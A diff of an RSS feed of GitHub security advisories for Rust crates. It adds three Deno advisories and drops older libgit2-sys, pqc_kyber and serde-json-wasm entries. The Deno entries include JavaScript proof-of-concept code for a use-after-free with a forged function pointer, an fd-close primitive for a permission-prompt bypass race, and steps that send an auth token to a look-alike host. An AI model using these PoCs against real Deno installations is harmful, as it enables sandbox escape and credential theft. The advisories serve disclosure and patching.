@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/rust.rss</id>
     <title>Security Advisory for Rust crates</title>
-    <updated>2024-03-06T17:01:31.789Z</updated>
+    <updated>2024-03-06T18:01:20.416Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arust"/>
     <subtitle>Security Advisory for Rust crates on GitHub</subtitle>
@@ -11,6 +11,213 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[Deno] *const c_void / ExternalPointer unsoundness leading to use-after-free]]></title>
+        <id>https://github.com/advisories/GHSA-3j27-563v-28wf</id>
+        <link href="https://github.com/advisories/GHSA-3j27-563v-28wf"/>
+        <updated>2024-03-06T17:04:30.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Use of inherently unsafe <code>*const c_void</code> and <code>ExternalPointer</code> leads to use-after-free access of the underlying structure, resulting in arbitrary code execution.</p>
+<h3 id="details">Details</h3>
+<p><code>*const c_void</code> and <code>ExternalPointer</code> (defined via <code>external!()</code> macros) types are used to represent <code>v8::External</code> wrapping arbitrary <code>void*</code> with an external lifetime. This is inherently unsafe as we are effectively eliding all Rust lifetime safety guarantees.</p>
+<p><code>*const c_void</code> is trivially unsafe. <code>ExternalPointer</code> attempts to resolve this issue by wrapping the underlying pointer with a <code>usize</code>d marker (<a href="https://github.com/denoland/deno_core/blob/a2838062a8f51926140a48a8aa926330c6f9070c/core/external.rs#L49"><code>ExternalWithMarker&lt;T&gt;</code></a>).</p>
+<p>However, the marker <a href="https://github.com/denoland/deno_core/blob/a2838062a8f51926140a48a8aa926330c6f9070c/core/external.rs#L10">relies on the randomness of PIE address (binary base address)</a> which is still trivially exploitable for a non-PIE binary. It is also equally exploitable on a PIE binary when an attacker is able to derandomize the PIE address. This is problematic as it escalates an information leak of the PIE address into an exploitable vulnerability.</p>
+<p>Note that an attacker able to control code executed inside the Deno runtime is very likely to be able to bypass ASLR with any means necessary (e.g. by chaining another vulnerability, or by using other granted permissions such as <code>--allow-read</code> to read <code>/proc/self/maps</code>).</p>
+<h3 id="poc">PoC</h3>
+<p>For simplicity, we use Deno version 1.38.0 where streaming operations uses <code>*const c_void</code>. Testing environment is Docker image <code>denoland/deno:alpine-1.38.0@sha256:fe51a00f4fbbaf1e72b29667c3eeeda429160cef2342f22a92c3820020d41f38</code> although the exact versions shouldn't matter much if it's in 1.36.2 up to 1.38.0 (before <code>ExternalPointer</code> patch, refer Impact section for details)</p>
+<pre><code class="language-js">const ops = Deno[Deno.internal].core.ops;
+const rid = ops.op_readable_stream_resource_allocate();
+const sink = ops.op_readable_stream_resource_get_sink(rid);
+
+// close
+ops.op_readable_stream_resource_close(sink);
+ops.op_readable_stream_resource_close(sink);
+
+// reclaim BoundedBufferChannelInner
+const ab = new ArrayBuffer(0x8058);
+const dv = new DataView(ab);
+
+// forge chunk contents
+dv.setBigUint64(0, 2n, true);
+dv.setBigUint64(0x8030, 0x1337c0d30000n, true);
+
+// trigger segfault
+Deno.close(rid);
+</code></pre>
+<p>Below is the dmesg log after the crash. We see that Deno has segfaulted on <code>1337c0d30008</code>, which is +8 of what we have written at offset 0x8030. Note also that the dereferenced value will immediately be used as a function pointer, with the first argument dereferenced from offset 0x8038 - it is trivial to use this to build an end-to-end exploit.</p>
+<pre><code class="language-text">[ 6439.821046] deno[15088]: segfault at 1337c0d30008 ip 0000557b53e2fb3e sp 00007fffd485ac70 error 4 in deno[557b51714000+2d7f000] likely on CPU 12 (core 12, socket 0)
+[ 6439.821054] Code: 00 00 00 00 48 85 c0 74 03 ff 50 08 49 8b 86 30 80 00 00 49 8b be 38 80 00 00 49 c7 86 30 80 00 00 00 00 00 00 48 85 c0 74 03 &lt;ff&gt; 50 08 48 ff 03 48 83 c4 08 5b 41 5e c3 48 8d 3d 0d 1a 59 fb 48
+</code></pre>
+<p>The same vulnerability exists for <code>ExternalPointer</code> implementation, but now it is required for the attacker to either leak the PIE address somehow, or else exploit unexpected aliasing behavior of <code>v8::External</code> values. The latter has not been investigated in depth, but it is theoretically possible to alias the same underlying pointer to different <code>v8::External</code> on different threads (Workers) and exploit the concurrency (<code>RefCell</code> may break this though).</p>
+<h3 id="impact">Impact</h3>
+<p>Use of inherently unsafe <code>*const c_void</code> and <code>ExternalPointer</code> leads to use-after-free access of the underlying structure, which is exploitable by an attacker controlling the code executed inside a Deno runtime to obtain arbitrary code execution on the host machine regardless of permissions.</p>
+<p>This bug is <strong>known to be exploitable</strong> for both <code>*const c_void</code> and <code>ExternalPointer</code> implementations.</p>
+<p>Affected versions of Deno is from 1.36.2 up to latest.</p>
+<ul>
+<li><a href="https://github.com/denoland/deno/blob/main/ext/web/stream_resource.rs">ext/web/stream_resource.rs</a>:<ul>
+<li><code>*const c_void</code> introduced in 1.36.2</li>
+<li>Patched into <code>ExternalPointer</code> in 1.38.1</li>
+</ul>
+</li>
+<li><a href="https://github.com/denoland/deno/blob/main/ext/http/http_next.rs">ext/http/http_next.rs</a>:<ul>
+<li><code>ExternalPointer</code> introduced in 1.38.2</li>
+</ul>
+</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/denoland/deno/security/advisories/GHSA-3j27-563v-28wf">https://github.com/denoland/deno/security/advisories/GHSA-3j27-563v-28wf</a></li>
+<li><a href="https://github.com/advisories/GHSA-3j27-563v-28wf">https://github.com/advisories/GHSA-3j27-563v-28wf</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-3j27-563v-28wf</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2024-03-06T17:04:29.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[deno] Deno arbitrary file descriptor close via `op_node_ipc_pipe()` leading to permission prompt bypass]]></title>
+        <id>https://github.com/advisories/GHSA-6q4w-9x56-rmwq</id>
+        <link href="https://github.com/advisories/GHSA-6q4w-9x56-rmwq"/>
+        <updated>2024-03-06T17:04:08.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Use of raw file descriptors in <code>op_node_ipc_pipe()</code> leads to premature close of arbitrary file descriptors, allowing standard input to be re-opened as a different resource resulting in permission prompt bypass.</p>
+<h3 id="details">Details</h3>
+<p>Node child_process IPC relies on the JS side to pass the raw IPC file descriptor to <code>op_node_ipc_pipe()</code>, which returns a <code>IpcJsonStreamResource</code> ID associated with the file descriptor. On closing the resource, the raw file descriptor is closed together.</p>
+<p>Although closing a file descriptor is seemingly a harmless task, this has been known to be exploitable:</p>
+<ul>
+<li>With <code>--allow-read</code> and <code>--allow-write</code> permissions, one can open <code>/dev/ptmx</code> as stdin. This device happily accepts TTY ioctls and pipes anything written into it back to the reader. <ul>
+<li>This has been presented in a hacking competition (WACON 2023 Quals "dino jail").</li>
+<li>However, the precondition of this challenge was heavily contrived: fd 0 has manually been closed by FFI and <code>setuid()</code> was used to drop permissions and deny access to <code>/proc</code> since global write permissions are usually equivalent to arbitrary code execution (<code>/proc/self/mem</code>).</li>
+</ul>
+</li>
+</ul>
+<p>As this vulnerability conveniently allows us to close stdin (fd 0) without any FFI, we can open any resource that when read returns <code>y</code>, <code>Y</code> or <code>A</code> as its first character (<a href="https://github.com/denoland/deno/blob/v1.39.0/runtime/permissions/prompter.rs#L265">runtimes/permissions/prompter.rs</a>) to bypass the prompt.</p>
+<p>There is a caveat however - all stdio/stdin/stderr streams are <a href="https://github.com/denoland/deno/blob/v1.39.0/runtime/permissions/prompter.rs#L214">locked</a>, after which <a href="https://github.com/denoland/deno/blob/v1.39.0/runtime/permissions/prompter.rs#L220"><code>clear_stdin()</code></a> is called. This invokes <a href="https://github.com/denoland/deno/blob/v1.39.0/runtime/permissions/prompter.rs#L99"><code>libc::tcflush(0, libc::TCIFLUSH)</code></a> which fails on a non-TTY file descriptor.</p>
+<p>This can be exploited by widening the race window between <code>clear_stdin()</code> and the next <a href="https://github.com/denoland/deno/blob/v1.39.0/runtime/permissions/prompter.rs#L256"><code>stdin_lock.read_line()</code></a>. Notably, the prompt message contains the requested resource name (path) which is filtered by <a href="https://github.com/denoland/deno/blob/v1.39.0/runtime/permissions/prompter.rs#L225"><code>strip_ansi_codes_and_ascii_control()</code></a>. This is also concatenated by <a href="https://github.com/denoland/deno/blob/v1.39.0/runtime/permissions/prompter.rs#L241"><code>write!()</code></a> to make a single buffer printed out to stderr. Thus, if we request a very long resource name, the window will widen allowing us to easily and stably race another Worker that closes fd 0 and opens a resource starting with an <code>A\n</code> within the race window.</p>
+<p>Note that attacker does not need any permissions to exploit this bug to a full permission prompt bypass, as Cache API can be used to create and open files with controlled content without any permissions. Refer to the Impact section for more details.</p>
+<h3 id="poc">PoC</h3>
+<p>Testing environment is Docker image <code>denoland/deno:alpine-1.39.0@sha256:95064390f2c115673762bfc4fe15b1a7f81c859038b8c02b277ede7cd8a2ccbf</code>.</p>
+<p>Below PoC closes stdout (fd 1) and then prints two lines, one on stdout and one on stderr. Only the latter line is shown as stdout file descriptor is closed.</p>
+<pre><code class="language-js">const ops = Deno[Deno.internal].core.ops;
+
+// open fd 1 as ipc stream resource
+const rid = ops.op_node_ipc_pipe(1);
+
+// close resource &amp; fd 1
+Deno.close(rid);
+
+// this should not be seen (stdout)
+console.log('not seen');
+
+// but this is seen (stderr)
+console.error('seen');
+</code></pre>
+<p>Below is <code>/proc/$(pgrep deno)/fd</code> right after executing the last line of the above PoC. We see that fd 1 is indeed missing.</p>
+<pre><code class="language-text">total 0
+dr-x------ 2 root root 30 Dec 18 07:07 ./
+dr-xr-xr-x 9 root root  0 Dec 18 07:07 ../
+lrwx------ 1 root root 64 Dec 18 07:07 0 -&gt; /dev/pts/0
+l-wx------ 1 root root 64 Dec 18 07:07 10 -&gt; 'pipe:[159305]'
+lr-x------ 1 root root 64 Dec 18 07:07 11 -&gt; 'pipe:[159306]'
+l-wx------ 1 root root 64 Dec 18 07:07 12 -&gt; 'pipe:[159306]'
+lrwx------ 1 root root 64 Dec 18 07:07 13 -&gt; /deno-dir/dep_analysis_cache_v1
+l-wx------ 1 root root 64 Dec 18 07:07 14 -&gt; 'pipe:[159305]'
+l-wx------ 1 root root 64 Dec 18 07:07 15 -&gt; 'pipe:[159306]'
+lrwx------ 1 root root 64 Dec 18 07:07 16 -&gt; /deno-dir/node_analysis_cache_v1
+lrwx------ 1 root root 64 Dec 18 07:07 17 -&gt; /dev/pts/0
+lrwx------ 1 root root 64 Dec 18 07:07 18 -&gt; /dev/pts/0
+lrwx------ 1 root root 64 Dec 18 07:07 19 -&gt; /dev/pts/0
+lrwx------ 1 root root 64 Dec 18 07:07 2 -&gt; /dev/pts/0
+lrwx------ 1 root root 64 Dec 18 07:07 20 -&gt; 'anon_inode:[eventpoll]'
+lrwx------ 1 root root 64 Dec 18 07:07 21 -&gt; 'anon_inode:[eventfd]'
+lrwx------ 1 root root 64 Dec 18 07:07 22 -&gt; 'anon_inode:[eventpoll]'
+lrwx------ 1 root root 64 Dec 18 07:07 23 -&gt; 'socket:[159302]'
+lrwx------ 1 root root 64 Dec 18 07:07 24 -&gt; 'anon_inode:[eventpoll]'
+lrwx------ 1 root root 64 Dec 18 07:07 25 -&gt; 'anon_inode:[eventfd]'
+lrwx------ 1 root root 64 Dec 18 07:07 26 -&gt; 'anon_inode:[eventpoll]'
+lrwx------ 1 root root 64 Dec 18 07:07 27 -&gt; 'socket:[159302]'
+lrwx------ 1 root root 64 Dec 18 07:07 28 -&gt; 'socket:[159310]'
+lrwx------ 1 root root 64 Dec 18 07:07 29 -&gt; 'socket:[159308]'
+lrwx------ 1 root root 64 Dec 18 07:07 3 -&gt; 'anon_inode:[eventpoll]'
+lrwx------ 1 root root 64 Dec 18 07:07 30 -&gt; 'socket:[159309]'
+lrwx------ 1 root root 64 Dec 18 07:07 4 -&gt; 'anon_inode:[eventfd]'
+lrwx------ 1 root root 64 Dec 18 07:07 5 -&gt; 'anon_inode:[eventpoll]'
+lrwx------ 1 root root 64 Dec 18 07:07 6 -&gt; 'socket:[159302]'
+lrwx------ 1 root root 64 Dec 18 07:07 7 -&gt; 'socket:[159303]'
+lrwx------ 1 root root 64 Dec 18 07:07 8 -&gt; 'socket:[159302]'
+lr-x------ 1 root root 64 Dec 18 07:07 9 -&gt; 'pipe:[159305]'
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>Use of raw file descriptors in <code>op_node_ipc_pipe()</code> leads to premature close of arbitrary file descriptors. This allow standard input (fd 0) to be closed and re-opened for a different resource, which allows a silent permission prompt bypass. This is exploitable by an attacker controlling the code executed inside a Deno runtime to obtain arbitrary code execution on the host machine regardless of permissions.</p>
+<p>This bug is <strong>known to be exploitable</strong> - there is a working exploit that achieves arbitrary code execution by bypassing prompts from zero permissions, additionally abusing the fact that Cache API lacks filesystem permission checks. The attack can be conducted silently as stderr can also be closed, suppressing all prompt outputs.</p>
+<blockquote>
+<p>Note that Deno's security model is currently described as follows:</p>
+<ul>
+<li>All runtime I/O is considered to be privileged and must always be guarded by a runtime permission. This includes filesystem access, network access, etc.<ul>
+<li>The only exception to this is runtime storage explosion attacks that are isolated to a part of the file system, caused by evaluated code (for example, caching big dependencies or no limits on runtime caches such as the Web Cache API).</li>
+</ul>
+</li>
+</ul>
+<p>Although it is ambiguous if the fundamental lack of file system permission checks on Web Cache API is a vulnerability or not, the reporter have not reported this as a vulnerability assuming that this is a known risk (or a feature).</p>
+</blockquote>
+<p>Affected version of Deno is 1.39.0.</p>
+<ul>
+<li>Introduced with commit 5a91a06</li>
+<li>Fixed with commit 55fac9f</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/denoland/deno/security/advisories/GHSA-6q4w-9x56-rmwq">https://github.com/denoland/deno/security/advisories/GHSA-6q4w-9x56-rmwq</a></li>
+<li><a href="https://github.com/denoland/deno/commit/55fac9f5ead6d30996400e8597c969b675c5a22b">https://github.com/denoland/deno/commit/55fac9f5ead6d30996400e8597c969b675c5a22b</a></li>
+<li><a href="https://github.com/denoland/deno/commit/5a91a065b882215dde209baf626247e54c21a392">https://github.com/denoland/deno/commit/5a91a065b882215dde209baf626247e54c21a392</a></li>
+<li><a href="https://github.com/advisories/GHSA-6q4w-9x56-rmwq">https://github.com/advisories/GHSA-6q4w-9x56-rmwq</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-6q4w-9x56-rmwq</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2024-03-06T17:04:08.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[deno] Deno's improper suffix match testing for DENO_AUTH_TOKENS]]></title>
+        <id>https://github.com/advisories/GHSA-5frw-4rwq-xhcr</id>
+        <link href="https://github.com/advisories/GHSA-5frw-4rwq-xhcr"/>
+        <updated>2024-03-06T17:03:38.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Deno improperly checks that an import specifier's hostname is equal to or a child of a token's hostname, which can cause tokens to be sent to servers they shouldn't be sent to. An auth token intended for <code>example.com</code> may be sent to <code>notexample.com</code>.</p>
+<h3 id="details">Details</h3>
+<p><a href="https://github.com/denoland/deno/blob/3f4639c330a31741b0efda2f93ebbb833f4f95bc/cli/auth_tokens.rs#L89">auth_tokens.rs uses a simple ends_with check</a>, which matches <code>www.deno.land</code> to a <code>deno.land</code> token as intended, but also matches <code>im-in-ur-servers-attacking-ur-deno.land</code> to <code>deno.land</code> tokens.</p>
+<h3 id="poc">PoC</h3>
+<ul>
+<li>Set up a server that logs requests. RequestBin will do. For example, <code>denovulnpoc.example.com</code>.</li>
+<li>Run <code>DENO_AUTH_TOKENS=a1b2c3d4e5f6@left-truncated.domain deno run https://not-a-left-truncated.domain</code>. For example, <code>DENO_AUTH_TOKENS=a1b2c3d4e5f6@poc.example.com deno run https://denovulnpoc.example.com</code></li>
+<li>Observe that the token intended only for the truncated domain is sent to the full domain</li>
+</ul>
+<h3 id="impact">Impact</h3>
+<p><em>What kind of vulnerability is it? Who is impacted?</em>
+Anyone who uses DENO_AUTH_TOKENS and imports potentially untrusted code is affected.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/denoland/deno/security/advisories/GHSA-5frw-4rwq-xhcr">https://github.com/denoland/deno/security/advisories/GHSA-5frw-4rwq-xhcr</a></li>
+<li><a href="https://github.com/denoland/deno/commit/de23e3b60b066481cc390f459497d5bef42a899b">https://github.com/denoland/deno/commit/de23e3b60b066481cc390f459497d5bef42a899b</a></li>
+<li><a href="https://github.com/advisories/GHSA-5frw-4rwq-xhcr">https://github.com/advisories/GHSA-5frw-4rwq-xhcr</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-5frw-4rwq-xhcr</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2024-03-06T17:03:36.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[eza] Duplicate Advisory: eza Potential Heap Overflow Vulnerability for AArch64]]></title>
         <id>https://github.com/advisories/GHSA-3xc6-7h59-j2x4</id>
@@ -535,90 +742,5 @@ This vulnerability is also known as <a href="https://rustsec.org/advisories/RUST
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2021-08-30T16:22:34.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[libgit2-sys] libgit2-sys affected by memory corruption, denial of service, and arbitrary code execution in libgit2]]></title>
-        <id>https://github.com/advisories/GHSA-22q8-ghmq-63vf</id>
-        <link href="https://github.com/advisories/GHSA-22q8-ghmq-63vf"/>
-        <updated>2024-02-12T15:42:15.000Z</updated>
-        <content type="html"><![CDATA[<p>The <a href="https://github.com/libgit2/libgit2/">libgit2</a> project fixed three security issues in the 1.7.2 release. These issues are:</p>
-<ul>
-<li>The <code>git_revparse_single</code> function can potentially enter an infinite loop on a well-crafted input, potentially causing a Denial of Service. This function is exposed in the <code>git2</code> crate via the <a href="https://docs.rs/git2/latest/git2/struct.Repository.html#method.revparse_single"><code>Repository::revparse_single</code></a> method.</li>
-<li>The <code>git_index_add</code> function may cause heap corruption and possibly lead to arbitrary code execution. This function is exposed in the <code>git2</code> crate via the <a href="https://docs.rs/git2/latest/git2/struct.Index.html#method.add"><code>Index::add</code></a> method.</li>
-<li>The smart transport negotiation may experience an out-of-bounds read when a remote server did not advertise capabilities.</li>
-</ul>
-<p>The <code>libgit2-sys</code> crate bundles libgit2, or optionally links to a system libgit2 library. In either case, versions of the libgit2 library less than 1.7.2 are vulnerable. The 0.16.2 release of <code>libgit2-sys</code> bundles the fixed version of 1.7.2, and requires a system libgit2 version of at least 1.7.2.</p>
-<p>It is recommended that all users upgrade.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/rust-lang/git2-rs/pull/1017">https://github.com/rust-lang/git2-rs/pull/1017</a></li>
-<li><a href="https://github.com/rust-lang/git2-rs/commit/9e57876be78924c1e5f3f268bb599e3981fe58bb">https://github.com/rust-lang/git2-rs/commit/9e57876be78924c1e5f3f268bb599e3981fe58bb</a></li>
-<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0013.html">https://rustsec.org/advisories/RUSTSEC-2024-0013.html</a></li>
-<li><a href="https://github.com/advisories/GHSA-22q8-ghmq-63vf">https://github.com/advisories/GHSA-22q8-ghmq-63vf</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-22q8-ghmq-63vf</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2024-02-12T15:42:14.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[pqc_kyber] pqc_kyber KyberSlash: division timings depending on secrets]]></title>
-        <id>https://github.com/advisories/GHSA-x5j2-g63m-f8g4</id>
-        <link href="https://github.com/advisories/GHSA-x5j2-g63m-f8g4"/>
-        <updated>2024-02-09T16:19:55.000Z</updated>
-        <content type="html"><![CDATA[<p>Various Kyber software libraries in various environments leak secret information into timing, specifically because</p>
-<ul>
-<li>these libraries include a line of code that divides a secret numerator by a public denominator,</li>
-<li>the number of CPU cycles for division in various environments varies depending on the inputs to the division, and</li>
-<li>this variation appears within the range of numerators used in these libraries.</li>
-</ul>
-<p>The KyberSlash pages track which Kyber <a href="https://kyberslash.cr.yp.to/libraries.html">libraries</a> have this issue, and include a <a href="https://kyberslash.cr.yp.to/faq.html">FAQ</a> about the issue.</p>
-<h2 id="author">Author</h2>
-<p>The KyberSlash pages were written by Daniel J. Bernstein. The FAQ originally said "I", but some people seemed to have trouble finding this authorship statement, so the FAQ now says "Bernstein" instead.</p>
-<h2 id="url">URL</h2>
-<p>The permanent link for the KyberSlash pages is <a href="https://kyberslash.cr.yp.to">https://kyberslash.cr.yp.to</a>.</p>
-<h2 id="mitigation-status-in-qpc_kyber-crate">Mitigation status in qpc_kyber crate</h2>
-<p>The issues has not been resolved in the <code>pqc_kyber</code> crate. A third-party fork that mitigates this attack vector has been published as <a href="https://crates.io/crates/safe_pqc_kyber"><code>safe_pqc_kyber</code></a>.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/Argyle-Software/kyber/issues/108">https://github.com/Argyle-Software/kyber/issues/108</a></li>
-<li><a href="https://github.com/bwesterb/argyle-kyber/commit/b5c6ad13f4eece80e59c6ebeafd787ba1519f5f6">https://github.com/bwesterb/argyle-kyber/commit/b5c6ad13f4eece80e59c6ebeafd787ba1519f5f6</a></li>
-<li><a href="https://rustsec.org/advisories/RUSTSEC-2023-0079.html">https://rustsec.org/advisories/RUSTSEC-2023-0079.html</a></li>
-<li><a href="https://github.com/advisories/GHSA-x5j2-g63m-f8g4">https://github.com/advisories/GHSA-x5j2-g63m-f8g4</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-x5j2-g63m-f8g4</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2024-02-09T16:19:53.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[serde-json-wasm] serde-json-wasm stack overflow during recursive JSON parsing]]></title>
-        <id>https://github.com/advisories/GHSA-rr69-rxr6-8qwf</id>
-        <link href="https://github.com/advisories/GHSA-rr69-rxr6-8qwf"/>
-        <updated>2024-02-09T16:03:33.000Z</updated>
-        <content type="html"><![CDATA[<p>When parsing untrusted, deeply nested JSON, the stack may overflow, possibly enabling a Denial of Service attack. This was fixed by adding a check for recursion depth.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/CosmWasm/serde-json-wasm/commit/a9a9b9bf243862bd2afbf6853fca97f30dc4f620">https://github.com/CosmWasm/serde-json-wasm/commit/a9a9b9bf243862bd2afbf6853fca97f30dc4f620</a></li>
-<li><a href="https://github.com/CosmWasm/serde-json-wasm/commit/e78f9e28b3a2151d3175ee88ab2a001bf9515429">https://github.com/CosmWasm/serde-json-wasm/commit/e78f9e28b3a2151d3175ee88ab2a001bf9515429</a></li>
-<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0012.html">https://rustsec.org/advisories/RUSTSEC-2024-0012.html</a></li>
-<li><a href="https://github.com/advisories/GHSA-rr69-rxr6-8qwf">https://github.com/advisories/GHSA-rr69-rxr6-8qwf</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-rr69-rxr6-8qwf</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2024-02-09T16:03:32.000Z</published>
     </entry>
 </feed>
